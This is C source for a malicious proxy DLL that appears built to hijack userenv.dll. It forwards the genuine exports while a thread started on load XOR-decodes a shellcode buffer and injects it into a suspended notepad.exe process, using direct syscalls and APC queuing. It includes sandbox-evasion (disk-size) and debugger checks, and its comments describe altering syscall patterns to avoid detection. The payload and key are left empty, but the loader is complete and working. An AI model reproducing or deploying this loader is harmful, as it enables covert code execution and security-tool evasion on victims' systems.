
#include <stdio.h>
#include <stdlib.h>
#include "syscalls.h"

#define _CRT_SECURE_NO_DEPRECATE

#pragma warning (disable : 4996)


//Here we specify the DLL exports of whatever dll we want to use in this case userenv.dll
//We must use sharpdllproxy to auto make us a C file which will include all this exports.
//In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls



#pragma comment(linker, "/export:=tmpB0F7.,@104")
#pragma comment(linker, "/export:RsopLoggingEnabled=tmpB0F7.RsopLoggingEnabled,@105")
#pragma comment(linker, "/export:AreThereVisibleLogoffScripts=tmpB0F7.AreThereVisibleLogoffScripts,@106")
#pragma comment(linker, "/export:AreThereVisibleShutdownScripts=tmpB0F7.AreThereVisibleShutdownScripts,@107")
#pragma comment(linker, "/export:CreateAppContainerProfile=tmpB0F7.CreateAppContainerProfile,@108")
#pragma comment(linker, "/export:CreateEnvironmentBlock=tmpB0F7.CreateEnvironmentBlock,@109")
#pragma comment(linker, "/export:CreateProfile=tmpB0F7.CreateProfile,@110")
#pragma comment(linker, "/export:DeleteAppContainerProfile=tmpB0F7.DeleteAppContainerProfile,@111")
#pragma comment(linker, "/export:DeleteProfileA=tmpB0F7.DeleteProfileA,@112")
#pragma comment(linker, "/export:DeleteProfileW=tmpB0F7.DeleteProfileW,@113")
#pragma comment(linker, "/export:DeriveAppContainerSidFromAppContainerName=tmpB0F7.DeriveAppContainerSidFromAppContainerName,@114")
#pragma comment(linker, "/export:DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=tmpB0F7.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName,@115")
#pragma comment(linker, "/export:DestroyEnvironmentBlock=tmpB0F7.DestroyEnvironmentBlock,@116")
#pragma comment(linker, "/export:DllCanUnloadNow=tmpB0F7.DllCanUnloadNow,@117")
#pragma comment(linker, "/export:DllGetClassObject=tmpB0F7.DllGetClassObject,@118")
#pragma comment(linker, "/export:DllRegisterServer=tmpB0F7.DllRegisterServer,@119")
#pragma comment(linker, "/export:DllUnregisterServer=tmpB0F7.DllUnregisterServer,@120")
#pragma comment(linker, "/export:EnterCriticalPolicySection=tmpB0F7.EnterCriticalPolicySection,@121")
#pragma comment(linker, "/export:=tmpB0F7.,@122")
#pragma comment(linker, "/export:ExpandEnvironmentStringsForUserA=tmpB0F7.ExpandEnvironmentStringsForUserA,@123")
#pragma comment(linker, "/export:ExpandEnvironmentStringsForUserW=tmpB0F7.ExpandEnvironmentStringsForUserW,@124")
#pragma comment(linker, "/export:ForceSyncFgPolicy=tmpB0F7.ForceSyncFgPolicy,@125")
#pragma comment(linker, "/export:FreeGPOListA=tmpB0F7.FreeGPOListA,@126")
#pragma comment(linker, "/export:FreeGPOListW=tmpB0F7.FreeGPOListW,@127")
#pragma comment(linker, "/export:GenerateGPNotification=tmpB0F7.GenerateGPNotification,@128")
#pragma comment(linker, "/export:GetAllUsersProfileDirectoryA=tmpB0F7.GetAllUsersProfileDirectoryA,@129")
#pragma comment(linker, "/export:GetAllUsersProfileDirectoryW=tmpB0F7.GetAllUsersProfileDirectoryW,@130")
#pragma comment(linker, "/export:GetAppContainerFolderPath=tmpB0F7.GetAppContainerFolderPath,@131")
#pragma comment(linker, "/export:GetAppContainerRegistryLocation=tmpB0F7.GetAppContainerRegistryLocation,@132")
#pragma comment(linker, "/export:GetAppliedGPOListA=tmpB0F7.GetAppliedGPOListA,@133")
#pragma comment(linker, "/export:GetAppliedGPOListW=tmpB0F7.GetAppliedGPOListW,@134")
#pragma comment(linker, "/export:=tmpB0F7.,@135")
#pragma comment(linker, "/export:GetDefaultUserProfileDirectoryA=tmpB0F7.GetDefaultUserProfileDirectoryA,@136")
#pragma comment(linker, "/export:=tmpB0F7.,@137")
#pragma comment(linker, "/export:GetDefaultUserProfileDirectoryW=tmpB0F7.GetDefaultUserProfileDirectoryW,@138")
#pragma comment(linker, "/export:=tmpB0F7.,@139")
#pragma comment(linker, "/export:GetGPOListA=tmpB0F7.GetGPOListA,@140")
#pragma comment(linker, "/export:GetGPOListW=tmpB0F7.GetGPOListW,@141")
#pragma comment(linker, "/export:GetNextFgPolicyRefreshInfo=tmpB0F7.GetNextFgPolicyRefreshInfo,@142")
#pragma comment(linker, "/export:GetPreviousFgPolicyRefreshInfo=tmpB0F7.GetPreviousFgPolicyRefreshInfo,@143")
#pragma comment(linker, "/export:GetProfileType=tmpB0F7.GetProfileType,@144")
#pragma comment(linker, "/export:GetProfilesDirectoryA=tmpB0F7.GetProfilesDirectoryA,@145")
#pragma comment(linker, "/export:GetProfilesDirectoryW=tmpB0F7.GetProfilesDirectoryW,@146")
#pragma comment(linker, "/export:GetUserProfileDirectoryA=tmpB0F7.GetUserProfileDirectoryA,@147")
#pragma comment(linker, "/export:GetUserProfileDirectoryW=tmpB0F7.GetUserProfileDirectoryW,@148")
#pragma comment(linker, "/export:HasPolicyForegroundProcessingCompleted=tmpB0F7.HasPolicyForegroundProcessingCompleted,@149")
#pragma comment(linker, "/export:LeaveCriticalPolicySection=tmpB0F7.LeaveCriticalPolicySection,@150")
#pragma comment(linker, "/export:LoadProfileExtender=tmpB0F7.LoadProfileExtender,@151")
#pragma comment(linker, "/export:LoadUserProfileA=tmpB0F7.LoadUserProfileA,@152")
#pragma comment(linker, "/export:LoadUserProfileW=tmpB0F7.LoadUserProfileW,@153")
#pragma comment(linker, "/export:ProcessGroupPolicyCompleted=tmpB0F7.ProcessGroupPolicyCompleted,@154")
#pragma comment(linker, "/export:ProcessGroupPolicyCompletedEx=tmpB0F7.ProcessGroupPolicyCompletedEx,@155")
#pragma comment(linker, "/export:RefreshPolicy=tmpB0F7.RefreshPolicy,@156")
#pragma comment(linker, "/export:RefreshPolicyEx=tmpB0F7.RefreshPolicyEx,@157")
#pragma comment(linker, "/export:RegisterGPNotification=tmpB0F7.RegisterGPNotification,@158")
#pragma comment(linker, "/export:RsopAccessCheckByType=tmpB0F7.RsopAccessCheckByType,@159")
#pragma comment(linker, "/export:RsopFileAccessCheck=tmpB0F7.RsopFileAccessCheck,@160")
#pragma comment(linker, "/export:RsopResetPolicySettingStatus=tmpB0F7.RsopResetPolicySettingStatus,@161")
#pragma comment(linker, "/export:RsopSetPolicySettingStatus=tmpB0F7.RsopSetPolicySettingStatus,@162")
#pragma comment(linker, "/export:UnloadProfileExtender=tmpB0F7.UnloadProfileExtender,@163")
#pragma comment(linker, "/export:UnloadUserProfile=tmpB0F7.UnloadUserProfile,@164")
#pragma comment(linker, "/export:UnregisterGPNotification=tmpB0F7.UnregisterGPNotification,@165")
#pragma comment(linker, "/export:WaitForMachinePolicyForegroundProcessing=tmpB0F7.WaitForMachinePolicyForegroundProcessing,@166")
#pragma comment(linker, "/export:WaitForUserPolicyForegroundProcessing=tmpB0F7.WaitForUserPolicyForegroundProcessing,@167")
#pragma comment(linker, "/export:=tmpB0F7.,@168")
#pragma comment(linker, "/export:=tmpB0F7.,@169")
#pragma comment(linker, "/export:=tmpB0F7.,@170")
#pragma comment(linker, "/export:=tmpB0F7.,@171")
#pragma comment(linker, "/export:=tmpB0F7.,@172")
#pragma comment(linker, "/export:=tmpB0F7.,@173")
#pragma comment(linker, "/export:=tmpB0F7.,@174")
#pragma comment(linker, "/export:=tmpB0F7.,@175")
#pragma comment(linker, "/export:=tmpB0F7.,@176")
#pragma comment(linker, "/export:=tmpB0F7.,@177")
#pragma comment(linker, "/export:=tmpB0F7.,@178")
#pragma comment(linker, "/export:=tmpB0F7.,@179")
#pragma comment(linker, "/export:=tmpB0F7.,@180")
#pragma comment(linker, "/export:=tmpB0F7.,@181")
#pragma comment(linker, "/export:=tmpB0F7.,@182")
#pragma comment(linker, "/export:=tmpB0F7.,@183")
#pragma comment(linker, "/export:=tmpB0F7.,@184")
#pragma comment(linker, "/export:=tmpB0F7.,@185")
#pragma comment(linker, "/export:=tmpB0F7.,@186")
#pragma comment(linker, "/export:=tmpB0F7.,@187")
#pragma comment(linker, "/export:=tmpB0F7.,@188")
#pragma comment(linker, "/export:=tmpB0F7.,@189")
#pragma comment(linker, "/export:=tmpB0F7.,@190")
#pragma comment(linker, "/export:=tmpB0F7.,@191")
#pragma comment(linker, "/export:=tmpB0F7.,@192")
#pragma comment(linker, "/export:=tmpB0F7.,@193")
#pragma comment(linker, "/export:=tmpB0F7.,@194")
#pragma comment(linker, "/export:=tmpB0F7.,@195")
#pragma comment(linker, "/export:=tmpB0F7.,@196")
#pragma comment(linker, "/export:=tmpB0F7.,@197")
#pragma comment(linker, "/export:=tmpB0F7.,@198")
#pragma comment(linker, "/export:=tmpB0F7.,@199")
#pragma comment(linker, "/export:=tmpB0F7.,@200")
#pragma comment(linker, "/export:=tmpB0F7.,@201")
#pragma comment(linker, "/export:=tmpB0F7.,@202")
#pragma comment(linker, "/export:=tmpB0F7.,@203")
#pragma comment(linker, "/export:=tmpB0F7.,@204")
#pragma comment(linker, "/export:=tmpB0F7.,@205")
#pragma comment(linker, "/export:=tmpB0F7.,@206")
#pragma comment(linker, "/export:=tmpB0F7.,@207")
#pragma comment(linker, "/export:=tmpB0F7.,@208")
#pragma comment(linker, "/export:=tmpB0F7.,@209")
#pragma comment(linker, "/export:=tmpB0F7.,@210")
#pragma comment(linker, "/export:=tmpB0F7.,@211")
#pragma comment(linker, "/export:=tmpB0F7.,@212")
#pragma comment(linker, "/export:=tmpB0F7.,@213")
#pragma comment(linker, "/export:=tmpB0F7.,@214")
#pragma comment(linker, "/export:=tmpB0F7.,@215")
#pragma comment(linker, "/export:=tmpB0F7.,@216")
#pragma comment(linker, "/export:=tmpB0F7.,@217")
#pragma comment(linker, "/export:=tmpB0F7.,@218")
#pragma comment(linker, "/export:=tmpB0F7.,@219")

BOOL executed = FALSE;

//xor decryption
void do_xor(unsigned char* data, size_t data_len, char* key, size_t key_len)
{
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++)
    {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
};

/*
Timing attack using waitable timers. Test fails if any of the calls return an error state.
*/
BOOL timing_CreateWaitableTimer(UINT delayInMillis)
{
    HANDLE hTimer;
    LARGE_INTEGER dueTime;

    BOOL bResult = FALSE;

    dueTime.QuadPart = delayInMillis * -10000LL;

    hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

    if (hTimer == NULL)
    {
        return TRUE;
    }

    if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
    {
        bResult = TRUE;
    }
    else {
        if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
        {
            bResult = TRUE;
        }
    }

    CancelWaitableTimer(hTimer);
    CloseHandle(hTimer);
    return bResult;
}
//sandbox check to check hardrive 
int gensandbox_drive_size() {
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;

    HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {
        // Someone is playing tricks. Or not encoded_kwdikas enough privileges.
        CloseHandle(drive);
        return FALSE;
    }
    BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
    CloseHandle(drive);

    if (result != 0) {
        if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
            return TRUE;
    }

    return FALSE;
}


DWORD WINAPI DoMagic(LPVOID lpParameter)
{

    unsigned char encoded_kwdikas[] = {
  
    };

    if (!executed)
    {

        executed = TRUE;

        LPVOID allocation_start;
        SIZE_T allocation_size = sizeof(encoded_kwdikas);
        NTSTATUS status = NULL;

        allocation_start = nullptr;

        char key[] = "";

        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        CreateProcessA("C:\\Windows\\system32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        HANDLE victimProcess = pi.hProcess;
        HANDLE threadHandle = pi.hThread;
        //delay execution
        timing_CreateWaitableTimer(4000);

        /*++

Routine Description:

    CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
    it can be used to check if a remote process is being debugged. However,
    we can also use this as another method for checking if our own process
    is being debugged. This API internally calls the NTDLL export
    NtQueryInformationProcess function with the PROCESSINFOCLASS set to
    7 (ProcessDebugPort).

Arguments:
    None
Return Value:

    TRUE - if debugger was detected
    FALSE - otherwise
--*/
        BOOL bIsDbgPresent = FALSE;
        DWORD oldProtect = NULL;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
        // Allocate Virtual Memory 
        NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        do_xor(encoded_kwdikas, sizeof(encoded_kwdikas), key, sizeof(key));
        // Copy shellcode into allocated memory
        NtWriteVirtualMemory(victimProcess, allocation_start, encoded_kwdikas, sizeof(encoded_kwdikas), 0);
        NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);

        NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
        NtResumeThread(threadHandle, NULL);
        return 0;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    LPVOID allocation_start;
    HANDLE hThread;
    allocation_start = nullptr;
    //HANDLE threadHandle;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        //sandbox check for harddisk size
        gensandbox_drive_size();


        hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(hThread);



    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        //sleep for 5 secs when  the process will be detached
        Sleep(5000);
        break;
    }
    return TRUE;
}



